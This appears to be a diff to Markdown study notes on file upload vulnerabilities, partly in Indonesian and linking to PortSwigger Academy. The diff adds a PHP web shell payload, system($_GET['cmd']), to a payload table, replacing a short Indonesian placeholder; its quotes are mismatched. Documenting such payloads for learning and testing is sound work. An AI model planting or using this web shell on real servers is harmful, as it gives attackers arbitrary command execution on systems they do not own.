@@ -5,7 +5,7 @@
 ## Payload
 |Tech|Payload|
 |---|---|
-|PHP|menggunakan unicode|
+|PHP|<?php<br>system($_GET["cmd']);<br>?>|
 
 ## Resource
 - [File Upload Vulnerability - Portswigger Academy](https://portswigger.net/web-security/file-upload)
